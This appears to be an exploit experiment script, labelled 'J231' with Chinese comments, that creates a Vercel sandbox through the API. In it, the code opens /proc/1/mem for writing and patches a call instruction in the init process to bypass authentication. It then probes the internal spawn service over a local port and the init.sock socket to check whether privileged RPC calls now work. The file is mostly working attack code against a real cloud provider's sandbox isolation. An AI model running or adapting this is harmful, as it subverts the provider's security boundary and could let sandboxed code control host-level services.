# 实验J231: patch认证绕过 + 独立进程POST验证
# 教训: 发POST的进程会被杀, 必须独立cmd; patch后text段被改, 验证RPC是否可调
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj231"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

bashfile(sid, "ls -la /run/vercel/share/ ; cp /run/vercel/share/sandbox-init /tmp/si 2>&1 ; ls -la /tmp/si 2>&1", "PREP", 3000)

# CMD1: patch
CODE1 = r'''
import os
out = open("/tmp/d231a.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)

old = ra(0x83afe0, 5)
p("OLD", old.hex())
if old == bytes.fromhex("e8bb030000"):
    wa(0x83afe0, bytes.fromhex("31c0909090"))
p("NEW", ra(0x83afe0, 5).hex())
os.close(fd)
p("done1")
out.close()
'''
st = run_cmd(sid, CODE1, "J231_PATCH", timeout=120)
time.sleep(1)
bashfile(sid, "cat /tmp/d231a.txt", "OUT1", 5000)

# CMD2: 独立进程 POST Ping (connect JSON) -> 看是否活 + 响应
CODE2 = '''import urllib.request
req = urllib.request.Request("http://127.0.0.1:30001/vercel.sandbox.spawn.v1.SpawnService/Ping", data=b"{}", method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("Connect-Protocol-Version", "1")
try:
    r = urllib.request.urlopen(req, timeout=6)
    print("HTTP", r.status, r.read()[:500])
except Exception as e:
    print("EXC", type(e).__name__, str(e)[:300])
print("DONE_POST", flush=True)
'''
st = run_cmd(sid, CODE2, "J231_POST30001", timeout=100)
time.sleep(1)

# CMD3: init.sock POST Ping (patch后)
CODE3 = '''import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect("/run/vercel/share/init.sock")
    print("CONNECT_OK", flush=True)
    s.send(b"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\nContent-Length: 2\\r\\n\\r\\n{}")
    d = b""
    try:
        while True:
            b2 = s.recv(4096)
            if not b2:
                break
            d += b2
            if len(d) > 2000:
                break
    except Exception as e:
        print("RECV_EXC", type(e).__name__, str(e)[:100], flush=True)
    print("RESP", d[:800].decode(errors="replace"), flush=True)
except Exception as e:
    print("SOCK_ERR", type(e).__name__, str(e)[:200], flush=True)
print("DONE3", flush=True)
'''
st = run_cmd(sid, CODE3, "J231_SOCK", timeout=100)
time.sleep(1)

# CMD4: 读全局观察点 (verify是否执行/pub是否加载)
CODE4 = r'''
import os, struct
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
for g in (0xe9e010, 0xe9e610):
    b = ra(g, 0x18)
    ptr, ln, cap = struct.unpack_from("<QQQ", b)
    print("G", hex(g), "ptr", hex(ptr), "len", ln, "cap", cap, flush=True)
print("done4", flush=True)
'''
st = run_cmd(sid, CODE4, "J231_OBJ", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
